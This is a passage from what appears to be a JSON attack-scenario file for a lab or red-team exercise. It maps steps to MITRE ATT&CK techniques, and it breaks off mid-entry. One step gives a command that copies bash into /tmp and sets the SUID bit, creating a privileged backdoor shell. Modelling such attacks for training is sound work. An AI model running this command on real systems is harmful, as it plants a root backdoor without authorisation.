      "from": "kali_root_user",
      "to": "suid_payload",
      "description": "Attacker copies bash and runs chmod +s locally",
      "cli": "cp /bin/bash /tmp/pe/shell && chmod +s /tmp/pe/shell"
    },
    {
      "id": 3,
      "name": "Network Transfer",
      "mitre": {
        "id": "T1068",
        "tactic": "Privilege Escalation",
